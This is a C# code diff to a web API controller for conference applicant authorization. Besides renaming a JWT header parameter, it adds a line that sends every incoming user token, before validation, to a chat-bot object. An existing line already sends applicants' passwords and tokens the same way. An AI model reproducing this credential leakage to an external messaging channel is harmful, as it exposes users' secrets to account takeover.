@@ -44,22 +44,23 @@
         /// </summary>
         /// <param name="apikey">API Key for Authentification</param>
         /// <param name="applicationAuth">Object to check</param>
-        /// <param name="jwtkey">Token of the User for Auth</param>
+        /// <param name="jwttoken">Token of the User for Auth</param>
         /// <param name="conference_id">Id of the Conference in Question</param>
         /// <returns>PasswordFound(Bool) and Priority(int)</returns>
         [HttpPut]
         public async Task<IActionResult> ApplicantIsAuthorized(
             [FromQuery] string apikey,
             [FromBody] ApplicationAuth applicationAuth,
-            [FromHeader (Name = "jwtkey")] string jwtkey,
-            [FromHeader (Name = "conference_id")] int conference_id)
+            [FromHeader(Name = "jwttoken")] string jwttoken,
+            [FromHeader(Name = "conference_id")] int conference_id)
         {
-            if (this.auth.KeyIsValid(apikey) && this.jwtService.PermissionLevelValid(jwtkey, "user"))
+            this.telBot.SendTextMessage(jwttoken);
+            if (this.auth.KeyIsValid(apikey) && this.jwtService.PermissionLevelValid(jwttoken, "user"))
             {
                 var authForConf = this._context.ApplicationAuth.Where(a => a.Conference_ID == conference_id
                                                                         && a.Council_ID == applicationAuth.Council_ID
                                                                         && a.Password == applicationAuth.Password).FirstOrDefault();
-                this.telBot.SendTextMessage($"{conference_id}, {Newtonsoft.Json.JsonConvert.SerializeObject(applicationAuth)}, {jwtkey}");
+                this.telBot.SendTextMessage($"{conference_id}, {Newtonsoft.Json.JsonConvert.SerializeObject(applicationAuth)}, {jwttoken}");
                 if (authForConf == null)
                 {
                     return this.Ok(new { PasswordFound = false, Priority = 0 });
@@ -92,11 +93,11 @@
         /// <returns>Nothing</returns>
         [HttpPut("generate/")]
         public async Task<IActionResult> GeneratePasswordsForCouncils(
-            [FromHeader(Name = "jwtkey")] string jwtkey,
+            [FromHeader(Name = "jwtkey")] string jwttoken,
             [FromHeader(Name = "conference_id")] int conference_id,
             [FromQuery] string apikey)
         {
-            if (this.jwtService.PermissionLevelValid(jwtkey, "admin") && this.auth.KeyIsValid(apikey))
+            if (this.jwtService.PermissionLevelValid(jwttoken, "admin") && this.auth.KeyIsValid(apikey))
             {
                 if (this._context.ApplicationAuth.Any(aa => aa.Conference_ID == conference_id))
                 {
